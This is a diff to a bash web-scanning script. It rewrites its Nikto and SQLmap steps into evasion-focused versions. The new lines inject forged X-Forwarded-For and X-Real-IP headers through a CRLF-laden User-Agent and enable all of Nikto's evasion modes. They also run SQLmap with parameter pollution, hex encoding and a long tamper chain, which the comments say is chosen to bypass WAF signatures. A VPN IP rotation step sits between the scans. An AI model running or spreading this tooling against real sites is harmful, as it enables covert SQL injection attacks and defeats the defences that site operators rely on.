@@ -327,10 +327,29 @@ main() {
     #   4=prepend long random string, 6=TAB as request spacer,
     #   7=random case sensitivity, 8=Windows path separator
 	# -maxtime 1800 Maximum testing time per host, ex. 1800 seconds
+    # echo -e "\e[38;5;208m[+] Nikto vulnerabilities scan...\e[0m"
+    # echo -e "\e[32m nikto -h \"$url\" -maxtime 1800 \e[0m"
+    # nikto -h "$url" -maxtime 1800 
+    # echo -e "\n\n"
+
+    # Nikto vulnerabilities scan
+    # -evasion 1234678 applies all available evasion techniques:
+    #   1=random URI encoding, 2=directory self-reference (/./),
+    #   3=premature URL ending (%00), 4=prepend long random string,
+    #   6=TAB as request spacer, 7=random case sensitivity,
+    #   8=Windows path separator (\)
+    # -useragent: spoofs a real browser UA
+    # -maxtime 1800: cap scan at 30 minutes
+    # Nikto has no -H flag for custom headers. WAF-bypass headers are injected
+    #   by appending them to -useragent separated by \r\n — nikto places the
+    #   UA string verbatim into the request, so \r\n starts a new header line.
+    NIKTO_UA="${USER_AGENT}\r\nX-Forwarded-For: 127.0.0.1\r\nX-Real-IP: 127.0.0.1\r\nX-Originating-IP: 127.0.0.1\r\nAccept-Language: en-US,en;q=0.9\r\nReferer: https://www.google.com/"
     echo -e "\e[38;5;208m[+] Nikto vulnerabilities scan...\e[0m"
-    echo -e "\e[32m nikto -h \"$url\" -maxtime 1800 \e[0m"
-    nikto -h "$url" -maxtime 1800 
-    echo -e "\n\n"
+    echo -e "\e[32m nikto -h \"$url\" -evasion 1234678 -useragent \"<ua+waf-bypass-headers>\" -maxtime 1800 \e[0m"
+    nikto -h "$url" \
+        -evasion 1234678 \
+        -useragent "$NIKTO_UA" \
+        -maxtime 1800	
 
 
     vpn_rotate_ip
@@ -338,9 +357,32 @@ main() {
     # SQLmap check for SQL injection
     # --random-agent rotates User-Agent, --delay=2 adds delay between requests,
     # --tamper applies payload obfuscation to bypass WAF signature matching
+    # echo -e "\e[38;5;208m[+] SQLmap check for SQL injection\e[0m"
+    # echo -e "\e[32m sqlmap --batch --random-agent --delay=2 --tamper=space2comment,between,randomcase -u \"$url\" \e[0m"
+    # sqlmap --batch --random-agent --delay=2 --tamper=space2comment,between,randomcase -u "$url"
+    
+	# SQLmap check for SQL injection
+    # --random-agent: rotates User-Agent to avoid UA-based blocking
+    # --delay=3: 3s between requests to evade rate-based WAF rules
+    # --level=3 --risk=2: broader coverage without overly destructive payloads
+    # --hpp: HTTP parameter pollution to confuse WAF parameter parsing
+    # --hex: encodes payloads in hex to bypass keyword-based WAF signatures
+    # --tamper chain (layered obfuscation — order matters):
+    #   space2comment   → replaces spaces with /**/ to break keyword+space patterns
+    #   between         → rewrites AND/OR comparisons to evade boolean-logic rules
+    #   randomcase      → randomizes SQL keyword casing (SeLeCt, UnIoN, etc.)
+    #   charunicodeencode → Unicode-encodes characters (%u0053%u0045...)
+    #   charencode      → URL-encodes characters (%53%45...)
+    #   equaltolike     → replaces = with LIKE to evade equality-check signatures
+    #   multiplespaces  → inserts multiple spaces between keywords
+    #   percentage      → adds % between characters to break simple regex rules
+    #   unmagicquotes   → escapes quotes with backslash to bypass quote filters
     echo -e "\e[38;5;208m[+] SQLmap check for SQL injection\e[0m"
-    echo -e "\e[32m sqlmap --batch --random-agent --delay=2 --tamper=space2comment,between,randomcase -u \"$url\" \e[0m"
-    sqlmap --batch --random-agent --delay=2 --tamper=space2comment,between,randomcase -u "$url"
+    echo -e "\e[32m sqlmap --batch --random-agent --delay=3 --level=3 --risk=2 --hpp --hex --tamper=space2comment,between,randomcase,charunicodeencode,charencode,equaltolike,multiplespaces,percentage,unmagicquotes -u \"$url\" \e[0m"
+    sqlmap --batch --random-agent --delay=3 --level=3 --risk=2 --hpp --hex \
+        --tamper=space2comment,between,randomcase,charunicodeencode,charencode,equaltolike,multiplespaces,percentage,unmagicquotes \
+        -u "$url"
+	
     echo -e "\n\n"
 
 
